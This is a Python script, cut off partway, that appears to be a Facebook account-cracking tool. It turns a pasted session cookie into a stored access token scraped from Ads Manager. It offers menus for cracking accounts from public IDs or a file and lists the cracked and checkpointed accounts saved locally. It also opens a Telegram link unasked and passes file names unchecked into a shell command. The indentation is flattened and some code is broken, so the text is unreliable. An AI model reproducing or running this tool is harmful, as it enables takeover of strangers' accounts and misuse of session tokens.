#
#
#
#
#
#
#
#
###
#
#
#
#
##
#
#
#
#
import requests,bs4,json,os,sys,random,datetime,time,re
try:
import rich
except ImportError:
os.system('pip install rich')
time.sleep(1)
try:
import rich
except ImportError:
exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
import rich
except ImportError:
os.system("xdg-open https://t.me/areshxorani")
os.system('pip install rich')
time.sleep(1)
try:
import rich
except ImportError:
exit('Cannot Install Module rich, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/5.0 (Linux; Android 10; vivo 1935) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; F1f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1901 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.10.2\t ', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.5.1300 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36 mCent/0.13.1214', 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1819 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.1', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.4.994 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; in-ID; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.9.8.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 OPR/52.2.2254.54723', 'Mozilla/5.0 (Linux; Android 10; V2032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.0.4.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.2.1303 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/47.1.2254.147528', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/52.1.2254.54298', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01', 'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.6.2) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/33.0.2254.125672', 'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.3beta', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.99 YaSearchBrowser/9.99', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 OPR/35.3.2254.129226', 'Mozilla/5.0 (Linux; U; Android 8.1.0; id-ID; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.5.1209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.0.0.50263AP', 'Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.8.1301 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.1.991 Mobile Safari/537.36NULL', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.66 Mobile Safari/537.36 OPR/52.1.2254.54298', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.4.0.42081AP', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326', 'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4\t ', 'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1610 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 6.0; ms-MY; vivo 1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.4.0.0\t ', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10', 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37f Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.0.828 U3/0.8.0 Mobile Safari/534.30', 'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.7.0) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.117 Mobile Safari/537.36 OPR/47.0.2254.146760', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.3.1219 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPR/52.2.2254.54574', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.1beta', 'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.0.1296 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.2.0.4beta', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/28.0.2254.119224', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4\t ', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1727 Build/N6F26Q; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 OPR/51.0.2254.150807']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']
# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni = [],[],0,0,0,[],[],[],[],[],[],[],[]
# COLORS
x = '\33[m' # DEFAULT
k = '\033[932m' # KUNING +
h = '\x1b[1;32m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[33m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;33m' # BIRU -
p = '\x1b[0;33m' # BIRU +
# Converter Bulan
header_grup = {
    "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
}
dic = {
    '1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'
}
dic2 = {
    '01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'
}
###########################################################################################
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
###########################################################################################
ua = 'Mozilla/-N29; HMSCore 6.4.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.1.302 Mobile Safari/537.36'
#################### #######################################################################
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# CLEAR
def b():
login()
def clear():
os.system('clear')
# BACK
def back():
login()
# BANNER
def banner():
clear()
print("""%s  \033[0;97m

➢i__________________brahim
➢a_________________hmad
➢m________________stafa
➢a--------------------------bdula
kurany kawraban>♠♣
hakarakan leran
-------------------------------------
  ibrahim  : Mr_TLYAK-jamahte_takeae
  mstafa  : https://github.com/Mr_TLYAKK
  None: Free For All
-------------------------------------------------
   """%(h))
# VALIDASI TOKEN
def login():
try:
token = open('.token.txt','r').read()
cok = open('.cok.txt','r').read()
tokenku.append(token)
try:
basariheker = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies = {
    'cookie':cok
})
basganteng = json.loads(basariheker.text)['id']
menu(basganteng)
except KeyError:
login_bas()
except requests.exceptions.ConnectionError:
print(f'[!] EROR  ! {
    x
}')
exit()
except IOError:
login_bas()
def login_bas():
try:
os.system('clear')
banner()
ses = requests.Session()
cookie = input(f' Cookies : ')
cookies = {
    'cookie':cookie
}
url = 'https://www.facebook.com/adsmanager/manage/campaigns'
req = ses.get(url,cookies = cookies)
set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
roq = ses.get(nek,cookies = cookies)
tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
ken = open(".token.txt", "w").write(tok)
cok = open(".cok.txt", "w").write(cookie)
print(f' GOOD ');time.sleep(1)
exit()
except Exception as e:
os.system('rm -rf .cok.txt && rm -rf .token.txt')
login_bas()
# MENU
def menu(my_name):
try:sh = requests.get('https://httpbin.org/ip').json()
except:sh = {
    'origin':'-'
}
try:
tglx = my_birthday.split('/')[1]
blnx = dic2[str(my_birthday.split('/')[0])]
thnx = my_birthday.split('/')[2]
birth = tglx+' '+blnx+' '+thnx
except:birth = '-'
banner()
sg = ' '
fx = mark(sg, style = 'bold white')
sol().print(fx)
io = ' 1= Cracking with PUBLIC ID \n2= Cracking with file\n3• exit'
oi = nel(io, style = 'bold green')
cetak(nel(oi, title = ''))
jh = input(x+''+p+'☠'+x+' CHOOSE : ')
if jh in ['1','01']:
dump_publik()
elif jh in ['99','099']:
dump_massal()
elif jh in ['2','02']:
TakeFile()
elif jh in ['44','0444']:
file()
elif jh in ['0','00']:
os.system('rm -rf .token.txt')
print(x+'['+h+'•'+x+'] Wait  ...')
time.sleep(1)
sw = '# get out remove cookies '
sol().print(mark(sw, style = 'green'))
exit()
else :
ric = '# CHOOSE IT`S WRONG'
sol().print(mark(ric, style = 'red'))
exit()
# Take File
def TakeFile():
try:
token = open('.token.txt','r').read()
cok = open('.cok.txt','r').read()
except IOError:
exit()
try:

jum = input('[+]  FILE : ')
for line in open(jum, 'r').readlines():
id.append(line.strip())
print('[+] ALL Id : '+str(len(id)))
setting()
except requests.exceptions.ConnectionError:
print('[✘] No Connection  ')
exit()
except (KeyError,IOError):
print('[✘] Id Is Not Public')
time.sleep(3)
follower()
# RESULT CHECKER
def result():
cek = '# ☠CHECK CRACK RESULT☠ '
sol().print(mark(cek, style = 'white'))
kayes = '[01] Check Cp Results\n[02] Check Ok Result\n[00] Back to Menu'
kis = nel(kayes, style = 'cyan')
cetak(nel(kis, title = 'RESULTS'))
kz = input(x+'['+p+'f'+x+'] select : ')
if kz in ['1','01']:
try:vin = os.listdir('CP')
except FileNotFoundError:
gada = '# DIRECTORY NOT FOUND'
sol().print(mark(gada, style = 'red'))
time.sleep(2)
back()
if len(vin) == 0:
haha = '# YOU DONT HAVE CP RESULT'
sol().print(mark(haha, style = 'yellow'))
time.sleep(2)
back()
else :
gerr = '# YOUR CP RESULT'
sol().print(mark(gerr, style = 'green'))
cih = 0
lol = {}
for isi in vin:
try:hem = open('CP/'+isi,'r').readlines()
except:continue
cih += 1
if cih < 10:
nom = '0'+str(cih)
lol.update({
    str(cih):str(isi)})
lol.update({
    nom:str(isi)})
print('['+nom+'] '+isi+'...☠ '+str(len(hem))+' Account'+x)
else :
lol.update({
    str(cih):str(isi)})
print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Account'+x)
gerr2 = '# SELECT RESULTS TO DISPLAY'
sol().print(mark(gerr2, style = 'green'))
geeh = input(x+'['+p+'f'+x+'] Select : ')
try:geh = lol[geeh]
except KeyError:
ric = '# OPTION NOT IN THE MENU'
sol().print(mark(ric, style = 'red'))
exit()
try:lin = open('CP/'+geh,'r').read()
except:
hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
sol().print(mark(hehe, style = 'red'))
time.sleep(2)
back()
akun = '# LIST YOUR CP ACCOUNT'
sol().print(mark(akun, style = 'green'))
hus = os.system('cd CP && cat '+geh)
akun2 = '# LIST YOUR CP ACCOUNT'
sol().print(mark(akun, style = 'green'))
input(x+'['+h+'•'+x+'] Return')
back()
elif kz in ['2','02']:
try:vin = os.listdir('OK')
